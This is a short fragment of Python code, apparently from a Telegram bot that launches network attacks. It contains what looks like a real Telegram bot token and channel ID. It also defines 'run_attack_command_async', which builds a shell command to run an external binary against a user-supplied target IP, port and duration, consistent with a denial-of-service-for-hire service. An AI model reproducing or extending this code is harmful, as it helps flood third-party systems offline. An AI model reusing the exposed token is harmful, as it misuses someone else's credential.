...
TOKEN = '7405943734:AAHWjg4-L6Hc04TCbrg0jWtuYeDecuA_Nn4'  # Replace with your actual bot token
CHANNEL_ID = '-1001593330522'  # Replace with your specific channel or group ID
# Initialize the bot
...
async def run_attack_command_async(target_ip, target_port, duration, user_duration, user_name):
    try:
        command = f"./mrinmoy {target_ip} {target_port} {duration} 50"
